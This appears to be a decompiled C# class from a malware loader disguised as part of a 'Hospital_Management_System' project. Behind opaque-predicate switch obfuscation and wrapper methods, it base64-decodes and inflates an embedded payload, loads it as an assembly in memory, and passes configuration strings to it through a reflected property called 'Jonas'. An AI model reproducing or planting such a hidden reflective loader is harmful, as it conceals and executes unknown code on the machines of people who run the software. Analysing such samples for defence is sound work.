using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace Hospital_Management_System;

public class SwitchValueState
{
	public SwitchValueState(string s1)
	{
		CspKeyContainerInfo(s1);
	}

	public byte[] WaitHandle(byte[] B)
	{
		object obj = SwitchValueState.smethod_0(B);
		bool[] array3 = default(bool[]);
		byte[] array2 = default(byte[]);
		object[] array = default(object[]);
		byte[] array4 = default(byte[]);
		int num3 = default(int);
		byte[] result = default(byte[]);
		object obj2 = default(object);
		while (true)
		{
			int num = 1055511019;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xAB5F79Du) % 21u)
				{
				case 20u:
				{
					int num7;
					int num8;
					if (array3[0])
					{
						num7 = -1682864403;
						num8 = -1682864403;
					}
					else
					{
						num7 = -413783843;
						num8 = -413783843;
					}
					num = num7 ^ (int)(num2 * 357134297);
					continue;
				}
				case 19u:
				{
					object[] obj3 = new object[3] { array2, 0, 4 };
					array = obj3;
					bool[] obj4 = new bool[3] { true, false, false };
					array3 = obj4;
					SwitchValueState.smethod_5(obj, (Type)null, "Read", obj3, (string[])null, (Type[])null, obj4, bool_1: true);
					int num5;
					int num6;
					if (array3[0])
					{
						num5 = -1149057345;
						num6 = -1149057345;
					}
					else
					{
						num5 = -135037027;
						num6 = -135037027;
					}
					num = num5 ^ (int)(num2 * 1184345145);
					continue;
				}
				case 18u:
					array4 = new byte[checked(num3 - 1 + 1)];
					num = (int)((num2 * 1252211318) ^ 0x7D75DD1D);
					continue;
				case 17u:
					array4 = (byte[])SwitchValueState.smethod_8(SwitchValueState.smethod_6(array[0]), SwitchValueState.smethod_7(typeof(byte[]).TypeHandle));
					num = 2098145575;
					continue;
				case 16u:
					result = array4;
					num = (int)(num2 * 1350263890) ^ -1695343640;
					continue;
				case 15u:
					num = (int)((num2 * 537648806) ^ 0x4CC2A025);
					continue;
				case 13u:
					num = (int)(num2 * 15482817) ^ -1428720664;
					continue;
				case 12u:
				{
					object object_ = obj2;
					object[] obj5 = new object[3] { array4, 0, num3 };
					array = obj5;
					bool[] obj6 = new bool[3] { true, false, true };
					array3 = obj6;
					SwitchValueState.smethod_5(object_, (Type)null, "Read", obj5, (string[])null, (Type[])null, obj6, bool_1: true);
					num = ((int)num2 * -1359519251) ^ 0x77D29B98;
					continue;
				}
				case 11u:
				{
					int num4;
					if (array3[2])
					{
						num = 1035946874;
						num4 = 1035946874;
					}
					else
					{
						num = 892581619;
						num4 = 892581619;
					}
					continue;
				}
				case 10u:
					num = (int)(num2 * 1491610429) ^ -648804985;
					continue;
				case 9u:
					obj2 = SwitchValueState.smethod_1((Stream)obj, CompressionMode.Decompress);
					array2 = new byte[4];
					num = ((int)num2 * -932769434) ^ -518026999;
					continue;
				case 8u:
					SwitchValueState.smethod_4(obj, (Type)null, "Position", new object[1] { 0 }, (string[])null, (Type[])null);
					num = ((int)num2 * -2089692848) ^ -402357367;
					continue;
				case 7u:
					array2 = (byte[])SwitchValueState.smethod_8(SwitchValueState.smethod_6(array[0]), SwitchValueState.smethod_7(typeof(byte[]).TypeHandle));
					num = 1491792822;
					continue;
				case 6u:
					num = ((int)num2 * -1255941842) ^ -933862902;
					continue;
				case 5u:
					SwitchValueState.smethod_5(obj2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, bool_1: true);
					SwitchValueState.smethod_5(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, bool_1: true);
					num = 585358642;
					continue;
				case 4u:
					SwitchValueState.smethod_4(obj, (Type)null, "Position", new object[1] { SwitchValueState.smethod_3(SwitchValueState.smethod_2(obj, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)5) }, (string[])null, (Type[])null);
					num = (int)(num2 * 334838015) ^ -804954358;
					continue;
				case 2u:
					num3 = SwitchValueState.smethod_9(array2, 0);
					num = 667869048;
					continue;
				case 1u:
					num3 = (int)SwitchValueState.smethod_8(SwitchValueState.smethod_6(array[2]), SwitchValueState.smethod_7(typeof(int).TypeHandle));
					num = 1632072049;
					continue;
				case 0u:
					num = ((int)num2 * -1489115672) ^ 0x63BE342E;
					continue;
				case 3u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public object CspKeyContainerInfo(string s1)
	{
		Type type_ = default(Type);
		PropertyInfo propertyInfo_ = default(PropertyInfo);
		object result = default(object);
		while (true)
		{
			int num = 1118873616;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xB650A81u) % 6u)
				{
				case 5u:
					type_ = SwitchValueState.smethod_15(SwitchValueState.smethod_14(SwitchValueState.smethod_10(), WaitHandle(SwitchValueState.smethod_13(SwitchValueState.smethod_11(s1), 0, SwitchValueState.smethod_12(s1)))))[0];
					num = (int)(num2 * 795153540) ^ -1894785183;
					continue;
				case 4u:
					SwitchValueState.smethod_17(propertyInfo_, (object)null, (object)new string[3]
					{
						IMethodMessage.xcdasdad,
						IMethodMessage.ccccccccccccccccca,
						"Hospital_Management_System"
					}, (object[])null);
					result = 0;
					num = ((int)num2 * -1227906306) ^ -1001676088;
					continue;
				case 3u:
					num = (int)((num2 * 250299411) ^ 0x70757F43);
					continue;
				case 0u:
					propertyInfo_ = SwitchValueState.smethod_16(type_, "Jonas");
					num = ((int)num2 * -193167522) ^ -1062268857;
					continue;
				case 2u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	static MemoryStream smethod_0(byte[] byte_0)
	{
		return new MemoryStream(byte_0);
	}

	static DeflateStream smethod_1(Stream stream_0, CompressionMode compressionMode_0)
	{
		return new DeflateStream(stream_0, compressionMode_0);
	}

	static object smethod_2(object object_0, Type type_0, string string_0, object[] object_1, string[] string_1, Type[] type_1, bool[] bool_0)
	{
		return NewLateBinding.LateGet(object_0, type_0, string_0, object_1, string_1, type_1, bool_0);
	}

	static object smethod_3(object object_0, object object_1)
	{
		return Operators.SubtractObject(object_0, object_1);
	}

	static void smethod_4(object object_0, Type type_0, string string_0, object[] object_1, string[] string_1, Type[] type_1)
	{
		NewLateBinding.LateSet(object_0, type_0, string_0, object_1, string_1, type_1);
	}

	static object smethod_5(object object_0, Type type_0, string string_0, object[] object_1, string[] string_1, Type[] type_1, bool[] bool_0, bool bool_1)
	{
		return NewLateBinding.LateCall(object_0, type_0, string_0, object_1, string_1, type_1, bool_0, bool_1);
	}

	static object smethod_6(object object_0)
	{
		return RuntimeHelpers.GetObjectValue(object_0);
	}

	static Type smethod_7(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static object smethod_8(object object_0, Type type_0)
	{
		return Conversions.ChangeType(object_0, type_0);
	}

	static int smethod_9(byte[] byte_0, int int_0)
	{
		return BitConverter.ToInt32(byte_0, int_0);
	}

	static AppDomain smethod_10()
	{
		return Thread.GetDomain();
	}

	static char[] smethod_11(string string_0)
	{
		return string_0.ToCharArray();
	}

	static int smethod_12(string string_0)
	{
		return string_0.Length;
	}

	static byte[] smethod_13(char[] char_0, int int_0, int int_1)
	{
		return Convert.FromBase64CharArray(char_0, int_0, int_1);
	}

	static Assembly smethod_14(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_15(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}

	static PropertyInfo smethod_16(Type type_0, string string_0)
	{
		return type_0.GetProperty(string_0);
	}

	static void smethod_17(PropertyInfo propertyInfo_0, object object_0, object object_1, object[] object_2)
	{
		propertyInfo_0.SetValue(object_0, object_1, object_2);
	}
}
